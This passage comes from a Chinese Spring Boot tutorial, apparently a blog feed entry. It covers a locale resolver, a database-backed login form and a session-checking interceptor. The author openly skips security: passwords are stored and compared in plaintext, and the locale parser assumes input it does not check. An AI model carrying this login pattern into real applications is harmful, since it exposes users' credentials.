class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyLocaleResolver</span> <span class="keyword">implements</span> <span class="title">LocaleResolver</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Locale <span class="title">resolveLocale</span><span class="params">(HttpServletRequest httpServletRequest)</span> </span>&#123;</span><br><span class="line">        String lang = httpServletRequest.getParameter(<span class="string">&quot;lang&quot;</span>); <span class="comment">// 获取请求参数lang</span></span><br><span class="line">        Locale locale = Locale.getDefault(); <span class="comment">// 获取系统默认的Locale</span></span><br><span class="line">        <span class="keyword">if</span>(lang != <span class="keyword">null</span> &amp;&amp; lang.length() !=<span class="number">0</span>)&#123; <span class="comment">// 若包含请求参数</span></span><br><span class="line">            String[] splitted = lang.split(<span class="string">&quot;-&quot;</span>); <span class="comment">// &quot;en_US&quot; -&gt; [&quot;en&quot;, &quot;US&quot;]</span></span><br><span class="line">            locale = <span class="keyword">new</span> Locale(splitted[<span class="number">0</span>], splitted[<span class="number">1</span>]); <span class="comment">// 创建新的locale</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> locale;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLocale</span><span class="params">(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Locale locale)</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现了这个组件后，我们需要将这个组件添加到容器中，我们向 <code>config.MyMvcConifg</code> 中添加配置方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> LocaleResolver <span class="title">localeResolver</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> MyLocaleResolver();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后修改我们的login.html文件，为下方的 english， 中文版添加超链接：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/(lang=zh-CN)&#125;&quot;</span>&gt;</span>中文<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-sm&quot;</span> <span class="attr">th:href</span>=<span class="string">&quot;@&#123;/(lang=en-US)&#125;&quot;</span>&gt;</span>English<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>即可发现现在点击下方的按钮可以切换语言:</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-15-20-54-06.png" alt="" /></p><h2 id="登录"><a class="markdownIt-Anchor" href="#登录"></a> 登录</h2><p>我们首先不考虑安全的实现一个简单的登录功能，用户在页面中输入用户名和密码，如果在数据库中存在用户名和密码，则用户登录成功，进入详情页面。否则提示用户登录失败。首先我们修改我们的登录页，添加表单的提交地址，并且为username 和 password 添加 name 属性：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">class</span>=<span class="string">&quot;form-signin&quot;</span> <span class="attr">action</span>=<span class="string">&quot;dashboard.html&quot;</span> <span class="attr">th:action</span>=<span class="string">&quot;@&#123;/api/session&#125;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">th:placeholder</span>=<span class="string">&quot;#&#123;login.username&#125;&quot;</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span> <span class="attr">autofocus</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">class</span>=<span class="string">&quot;form-control&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;Password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">th:placeholder</span>=<span class="string">&quot;#&#123;login.password&#125;&quot;</span> <span class="attr">required</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>接下来在 entity 包下创建 User 类，加上JPA注解以及Getter，Setter：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">// 主键</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(unique = true, nullable = false)</span> <span class="comment">// 非空，唯一</span></span><br><span class="line">    <span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Column(nullable = false)</span></span><br><span class="line">    <span class="keyword">private</span> String password;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Repository 包下创建 UserRepository 接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">User</span>, <span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">findByUsername</span><span class="params">(String username)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在接口里增加了一个方法 <code>findByUsername()</code>，这里的方法名指定了查询条件，对于这个方法，Spring Data JPA 会自动为我们生成相应的查询语句而无需我们做任何实现，具体的方法命名规则参考 <a href="https://docs.spring.io/spring-data/jpa/docs/current/reference/html/#jpa.query-methods.query-creation">官方文档</a>。就此我们的数据访问就已经完成，在application.yml中添加数据库的相应配置以及启用generate-ddl，运行项目，让Spring Data自动为我们在数据库中创建User表。在User表中添加一个用户用于测试：</p><p><img src="/img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-17-22-27-02.png" alt="" /></p><p>接下来编写Controller，在controller包下创建 <code>LoginController</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/api&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    UserRepository userRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@PostMapping(&quot;/session&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username,</span></span></span><br><span class="line"><span class="params"><span class="function">                        <span class="meta">@RequestParam(&quot;password&quot;)</span> String password,</span></span></span><br><span class="line"><span class="params"><span class="function">                        Map&lt;String, String&gt; map)</span></span>&#123;</span><br><span class="line">        <span class="comment">// 根据用户名获取用户</span></span><br><span class="line">        User loginUser = userRepository.findByUsername(username);</span><br><span class="line">        <span class="comment">// 用户存在 对比密码</span></span><br><span class="line">        <span class="keyword">if</span>(loginUser!= <span class="keyword">null</span> &amp;&amp; loginUser.getPassword().equals(password))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;dashboard&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            map.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;用户名密码错误&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在 <code>login.html</code> 中的Please Sign in 下添加如下一行，添加密码错误时的错误提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;color: darkred&quot;</span> <span class="attr">th:text</span>=<span class="string">&quot;$&#123;msg&#125;&quot;</span> <span class="attr">th:if</span>=<span class="string">&quot;$&#123;not #strings.isEmpty(msg)&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>现在尝试登录，访问 <code>localhost:8080</code>，并输入错误的用户名和密码：</p><p><img src="img/(2020-06-14)SpringBoot-Web%E5%BC%80%E5%8F%91.md/2020-06-17-22-34-00.png" alt="" /></p><p>再尝试正确的密码，发现成功跳转到了dashboard页面。</p><h2 id="拦截器"><a class="markdownIt-Anchor" href="#拦截器"></a> 拦截器</h2><p>现在如果我们在dashboard界面刷新，你会发现浏览器提示我们是否需要重新提交表单。这是因为刷新时浏览器会重新发送我们登录时的Post请求。为了防止重复提交，我们修改为重定向的方式来让用户到达dashboard页面。观察我们之前的请求，用户登录成功后，浏览器的url栏显示的时我们post地址的url，而修改为重定向后，浏览器则会跳转到我们重定向的url。</p><p>首先修改 <code>HelloController</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(loginUser!= <span class="keyword">null</span> &amp;&amp; loginUser.getPassword().equals(password))&#123;</span><br><span class="line">    session.setAttribute(<span class="string">&quot;loginUser&quot;</span>, loginUser.getId());</span><br><span class="line">    <span class="comment">// return &quot;dashboard&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;redirect:/main&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在用户登录成功后，我们将用户重定向到 <code>/main</code>，也就是说浏览器会向 <code>/main</code> 发送一次请求，因此我们将 dashboard视图绑定到 <code>/main</code>, 修改 <code>MyMvcConfig</code> 配置类中我们之前实现的 <code>WebMvcConfigurator</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">    registry.addViewController(<span class="string">&quot;/&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">    registry.addViewController(<span class="string">&quot;/index.html&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">    <span class="comment">// 重定向 /main 到视图 dashboard</span></span><br><span class="line">    registry.addViewController(<span class="string">&quot;/main&quot;</span>).setViewName(<span class="string">&quot;dashboard&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时再次登录，你会发现浏览器会自动跳转到 <code>localhost:8080/main</code>，并且刷新浏览器也不会再提示需要重新提交表单。但是此时你会发现一个问题，就是如果此时我们在其他浏览器中直接访问 <code>localhost:8080/main</code>，便跳过了登陆直接进入了dashboard，这是我们不希望看到的，因此我们需要拦截那些未登录用户的请求，这里就用到了拦截器。首先我们要做的是识别一个用户的登录状态，修改 <code>LoginContoller</code> 中的 login 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/session&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">login</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username,</span></span></span><br><span class="line"><span class="params"><span class="function">                    <span class="meta">@RequestParam(&quot;password&quot;)</span> String password,</span></span></span><br><span class="line"><span class="params"><span class="function">                    Map&lt;String, String&gt; map,</span></span></span><br><span class="line"><span class="params"><span class="function">                    // 传入session</span></span></span><br><span class="line"><span class="params"><span class="function">                    HttpSession session)</span></span>&#123;</span><br><span class="line">    User loginUser = userRepository.findByUsername(username);</span><br><span class="line">    <span class="keyword">if</span>(loginUser!= <span class="keyword">null</span> &amp;&amp; loginUser.getPassword().equals(password))&#123;</span><br><span class="line">        <span class="comment">// 将登录用户的id保存在session中</span></span><br><span class="line">        session.setAttribute(<span class="string">&quot;loginUser&quot;</span>, loginUser.getId());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;redirect:/main&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        map.put(<span class="string">&quot;msg&quot;</span>, <span class="string">&quot;用户名密码错误&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;login&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时我们就可以判断session中是否有 <code>loginUser</code> 这个attribute来判断用户是否登录，接下来我们就可以开始编写我们的拦截器，在 component 包下新建 <code>LoginHandlerInterceptor</code> 类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LoginHandlerInterceptor</span> <span class="keyword">implements</span> <span class="title">HandlerInterceptor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 取出 loginUser</span></span><br><span class="line">        Object loginUserId = request.getSession().getAttribute(<span class="string">&quot;loginUser&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(loginUserId != <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="comment">// 若存在，则用户已登录，放行请求</span></span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 若不存在，重定向用户到登录页面</span></span><br><span class="line">            request.getRequestDispatcher(<span class="string">&quot;/index.html&quot;</span>).forward(request, response);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterCompletion</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该类实现了 <code>HandlerInterceptor</code> 接口，这个接口有三个方法，当容器收到一个请求后，如果满足条件，则会在controller方法执行前先执行 <code>preHandle</code> 方法，该方法的返回值是一个布尔值，代表的是是否拦截该请求。接下来修改配置类，将我们自定义的拦截器添加进容器。修改 <code>MyMvcConfig</code> 类，之前我们在该类中添加了一个返回 <code>WebMvcConfigurator</code> 的方法，我们在该方法中编写了一个 <code>WebMvcConfigurator</code> 的匿名实现类用于重定向的配置，现在我们为这个类添加一个新的方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> WebMvcConfigurer <span class="title">webMvcConfigurer</span><span class="params">()</span></span>&#123;</span><br><span class="line">    WebMvcConfigurer webMvcConfigurer = <span class="keyword">new</span> WebMvcConfigurer() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addViewControllers</span><span class="params">(ViewControllerRegistry registry)</span> </span>&#123;</span><br><span class="line">            registry.addViewController(<span class="string">&quot;/&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">            registry.addViewController(<span class="string">&quot;/index.html&quot;</span>).setViewName(<span class="string">&quot;login&quot;</span>);</span><br><span class="line">            registry.addViewController(<span class="string">&quot;/main&quot;</span>).setViewName(<span class="string">&quot;dashboard&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> </span>&#123;</span><br><span class="line">            registry.addInterceptor(<span class="keyword">new</span> LoginHandlerInterceptor())</span><br><span class="line">                    <span class="comment">// 拦截所有请求</span></span><br><span class="line">                    .addPathPatterns(<span class="string">&quot;/**&quot;</span>) </span><br><span class="line">                    <span class="comment">// 排除登录页面和登录请求的拦截</span></span><br><span class="line">                    .excludePathPatterns(<span class="string">&quot;/index.html&quot;</span>,<span class="string">&quot;/&quot;</span>,<span class="string">&quot;/api/session&quot;</span>)</span><br><span class="line">                    <span class="comment">// 排除静态资源的拦截</span></span><br><span class="line">                    .excludePathPatterns(<span class="string">&quot;/asserts/**&quot;</span>, <span class="string">&quot;/webjars/**&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">return</span> webMvcConfigurer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样未登录的用户就只能登录请求页面和发送登录请求，对于服务器其他url的访问都会被拦截器拦截，并且强制跳转到登录页面。现在，我们再尝试在另一个浏览器访问 <code>localhost:8080/main</code>，会发现直接跳转到了登录界面。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在写这篇笔记之前我也有很多思考，我参考的教程中有很多SpringMVC以及JSP，模板引擎的内容。貌似现在的开发大环境下，后端需要兼顾手机App和网页版共同的请求，前后端分离是大的趋势。但是我仍然准备学习一下传统的服务器端渲染的相关技术。一方面是感受一下技术的演进，另一方面是前后端分离不利于SEO（Serach Engine Optimization），很多现有的产品仍然使用服务器渲染的原因就是搜索引擎。虽然现在可能会有一些更加成熟的方案（nodejs作为中间层），但是咱们还是一步一步来。第一部分我们熟悉模板引擎，静态资源映射，并实现简单的登录功能。&lt;/p&gt;</summary>
    
    
    
    <category term="找工作" scheme="https://virgilchen97.github.io/categories/%E6%89%BE%E5%B7%A5%E4%BD%9C/"/>
    
    
    <category term="Spring" scheme="https://virgilchen97.github.io/tags/Spring/"/>
    
    <category term="SpringBoot" scheme="https://virgilchen97.github.io/tags/SpringBoot/"/>
    
  </entry>
  
</feed>
